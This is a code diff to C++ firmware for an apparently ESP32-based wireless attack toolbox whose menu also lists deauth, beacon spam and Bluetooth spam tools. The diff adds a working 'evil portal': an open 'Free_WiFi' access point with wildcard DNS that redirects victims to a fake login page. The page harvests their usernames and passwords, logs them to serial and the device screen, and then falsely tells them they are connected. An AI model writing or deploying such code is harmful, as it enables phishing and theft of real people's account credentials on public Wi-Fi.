@@ -7,10 +7,12 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <NimBLEDevice.h>
+#include <WebServer.h>
+#include <DNSServer.h>
 
 // ---- Which tool is actively running ----
 enum class ActiveTool : uint8_t {
-    NONE = 0, WIFI_SCAN, DEAUTH, BEACON_SPAM, RICKROLL, CLONE_AP,
+    NONE = 0, WIFI_SCAN, DEAUTH, BEACON_SPAM, RICKROLL, CLONE_AP, EVIL_PORTAL,
     PROBE_SNIFF, BLE_SCAN, BLE_TRACK, APPLE_SPAM, SAMSUNG_SPAM, SWIFTPAIR_SPAM
 };
 
@@ -556,6 +558,138 @@ static void drawCloneAp(TFT_eSPI& t, uint32_t now) {
 
     t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
     t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.drawString("TAP TO STOP", w / 2, h - 12, 2);
+}
+
+// =============================================================================
+//  EVIL PORTAL — captive portal that captures credentials
+// =============================================================================
+static WebServer* s_portalWeb = nullptr;
+static DNSServer* s_portalDns = nullptr;
+static char s_portalSsid[33] = {0};
+static uint32_t s_portalHits = 0;
+
+static const int MAX_CREDS = 20;
+struct CapturedCred {
+    char user[32];
+    char pass[32];
+};
+static CapturedCred s_creds[MAX_CREDS];
+static int s_credCount = 0;
+
+static const char PORTAL_HTML[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:#16213e;padding:30px;border-radius:12px;width:300px;box-shadow:0 0 20px rgba(0,0,0,0.5)}
+h2{text-align:center;color:#e94560}input{width:100%;padding:12px;margin:8px 0;border:1px solid #0f3460;border-radius:6px;background:#1a1a2e;color:#eee;box-sizing:border-box}
+button{width:100%;padding:12px;background:#e94560;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:16px}
+button:hover{background:#c81e45}</style></head>
+<body><div class="box"><h2>WiFi Login Required</h2><form action="/login" method="POST">
+<input name="user" placeholder="Email or Username" required>
+<input name="pass" type="password" placeholder="Password" required>
+<button type="submit">Connect</button></form></div></body></html>
+)rawliteral";
+
+static const char PORTAL_SUCCESS[] PROGMEM = R"rawliteral(
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
+<style>body{font-family:Arial;background:#1a1a2e;color:#eee;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{background:#16213e;padding:30px;border-radius:12px;text-align:center}</style></head>
+<body><div class="box"><h2 style="color:#4ecca3">Connected!</h2><p>You may now use the internet.</p></div></body></html>
+)rawliteral";
+
+static void portalHandleRoot() {
+    s_portalWeb->send(200, "text/html", PORTAL_HTML);
+    s_portalHits++;
+}
+
+static void portalHandleLogin() {
+    String user = s_portalWeb->arg("user");
+    String pass = s_portalWeb->arg("pass");
+    if (s_credCount < MAX_CREDS) {
+        strncpy(s_creds[s_credCount].user, user.c_str(), 31);
+        strncpy(s_creds[s_credCount].pass, pass.c_str(), 31);
+        s_credCount++;
+    }
+    Serial.printf("[portal] CAPTURED: %s / %s\n", user.c_str(), pass.c_str());
+    s_portalWeb->send(200, "text/html", PORTAL_SUCCESS);
+}
+
+static void portalHandleNotFound() {
+    s_portalWeb->sendHeader("Location", "http://192.168.4.1/", true);
+    s_portalWeb->send(302, "text/plain", "");
+    s_portalHits++;
+}
+
+static void evilPortalStart() {
+    strncpy(s_portalSsid, "Free_WiFi", 32);
+    s_portalHits = 0;
+    s_credCount = 0;
+
+    WiFi.mode(WIFI_AP);
+    WiFi.softAP(s_portalSsid, NULL, 1, 0, 4);
+
+    s_portalDns = new DNSServer();
+    s_portalDns->start(53, "*", WiFi.softAPIP());
+
+    s_portalWeb = new WebServer(80);
+    s_portalWeb->on("/", portalHandleRoot);
+    s_portalWeb->on("/login", HTTP_POST, portalHandleLogin);
+    s_portalWeb->onNotFound(portalHandleNotFound);
+    s_portalWeb->begin();
+    Serial.printf("[toolbox] Evil portal started: %s at %s\n",
+                  s_portalSsid, WiFi.softAPIP().toString().c_str());
+}
+
+static void evilPortalStop() {
+    if (s_portalWeb) { s_portalWeb->stop(); delete s_portalWeb; s_portalWeb = nullptr; }
+    if (s_portalDns) { s_portalDns->stop(); delete s_portalDns; s_portalDns = nullptr; }
+    WiFi.softAPdisconnect(true);
+    WiFi.mode(WIFI_OFF);
+}
+
+static void drawEvilPortal(TFT_eSPI& t, uint32_t now) {
+    const int w = t.width();
+    const int h = t.height();
+
+    s_portalDns->processNextRequest();
+    s_portalWeb->handleClient();
+
+    t.setTextColor(Theme::RED, Theme::BG);
+    t.setTextDatum(MC_DATUM);
+    t.drawString("EVIL PORTAL", w / 2, HEADER_H + 20, 4);
+
+    t.setTextColor(Theme::CYAN, Theme::BG);
+    char buf[48];
+    snprintf(buf, sizeof buf, "SSID: %s", s_portalSsid);
+    t.drawString(buf, w / 2, HEADER_H + 50, 2);
+
+    t.setTextColor(Theme::GREEN, Theme::BG);
+    snprintf(buf, sizeof buf, "IP: %s", WiFi.softAPIP().toString().c_str());
+    t.drawString(buf, w / 2, HEADER_H + 70, 2);
+
+    snprintf(buf, sizeof buf, "Clients: %d  |  Hits: %lu",
+             (int)WiFi.softAPgetStationNum(), (unsigned long)s_portalHits);
+    t.setTextColor(Theme::AMBER, Theme::BG);
+    t.drawString(buf, w / 2, HEADER_H + 90, 2);
+
+    // Captured credentials
+    t.setTextColor(Theme::VAPOR_PINK, Theme::BG);
+    snprintf(buf, sizeof buf, "CAPTURED: %d", s_credCount);
+    t.drawString(buf, w / 2, HEADER_H + 120, 4);
+
+    // Show captured creds
+    int listY = HEADER_H + 155;
+    for (int i = 0; i < min(s_credCount, 5); i++) {
+        int idx = s_credCount - 1 - i;  // most recent first
+        t.setTextColor(Theme::CYAN, Theme::BG);
+        t.setTextDatum(TL_DATUM);
+        snprintf(buf, sizeof buf, "%s : %s", s_creds[idx].user, s_creds[idx].pass);
+        t.drawString(buf, 8, listY + i * 18, 2);
+    }
+
+    t.fillRect(0, h - 24, w, 24, Theme::TASKBAR);
+    t.setTextColor(Theme::AMBER, Theme::TASKBAR);
+    t.setTextDatum(MC_DATUM);
     t.drawString("TAP TO STOP", w / 2, h - 12, 2);
 }
 
@@ -1200,6 +1334,9 @@ static void stopActiveTool() {
             WiFi.softAPdisconnect(true);
             WiFi.mode(WIFI_OFF);
             break;
+        case ActiveTool::EVIL_PORTAL:
+            evilPortalStop();
+            break;
         case ActiveTool::PROBE_SNIFF:
             probeSniffStop();
             break;
@@ -1234,7 +1371,8 @@ static void launchTool(ActiveTool tool) {
         case ActiveTool::WIFI_SCAN:   wifiScanStart();   break;
         case ActiveTool::DEAUTH:      /* needs target, handled separately */ break;
         case ActiveTool::BEACON_SPAM: beaconSpamStart();  break;
-        case ActiveTool::RICKROLL:    rickrollStart();    break;
+        case ActiveTool::RICKROLL:      rickrollStart();    break;
+        case ActiveTool::EVIL_PORTAL:   evilPortalStart();  break;
         case ActiveTool::PROBE_SNIFF: probeSniffStart();  break;
         case ActiveTool::BLE_SCAN:    bleScanStart();     break;
         case ActiveTool::APPLE_SPAM:    appleSpamStart();   break;
@@ -1292,6 +1430,7 @@ static const char* headerForLevel(ToolboxLevel lvl) {
                 case ActiveTool::BEACON_SPAM: return "BEACON SPAM";
                 case ActiveTool::RICKROLL:    return "RICKROLL";
                 case ActiveTool::CLONE_AP:    return "CLONE AP";
+                case ActiveTool::EVIL_PORTAL: return "EVIL PORTAL";
                 case ActiveTool::PROBE_SNIFF: return "PROBE SNIFF";
                 case ActiveTool::BLE_SCAN:    return "BLE SCAN";
                 case ActiveTool::APPLE_SPAM:    return "APPLE SPAM";
@@ -1544,6 +1683,7 @@ void uiToolboxTick(TFT_eSPI& t, uint32_t now) {
             case ActiveTool::BEACON_SPAM: drawBeaconSpam(t, now); break;
             case ActiveTool::RICKROLL:    drawRickroll(t, now);   break;
             case ActiveTool::CLONE_AP:    drawCloneAp(t, now);    break;
+            case ActiveTool::EVIL_PORTAL: drawEvilPortal(t, now); break;
             case ActiveTool::PROBE_SNIFF: drawProbeSniff(t, now); break;
             case ActiveTool::BLE_SCAN:    drawBleScan(t, now);    break;
             case ActiveTool::APPLE_SPAM:    drawAppleSpam(t, now);      break;
@@ -1604,8 +1744,9 @@ static bool handleWifiTap(int idx) {
             }
             break;
         case WifiTool::BEACON_SPAM:   launchTool(ActiveTool::BEACON_SPAM); break;
-        case WifiTool::RICKROLL:      launchTool(ActiveTool::RICKROLL); break;
-        case WifiTool::PROBE_SNIFF:   launchTool(ActiveTool::PROBE_SNIFF); break;
+        case WifiTool::RICKROLL:       launchTool(ActiveTool::RICKROLL); break;
+        case WifiTool::EVIL_PORTAL:    launchTool(ActiveTool::EVIL_PORTAL); break;
+        case WifiTool::PROBE_SNIFF:    launchTool(ActiveTool::PROBE_SNIFF); break;
         default:
             s_toolActive = true;
             s_activeTool = ActiveTool::NONE;
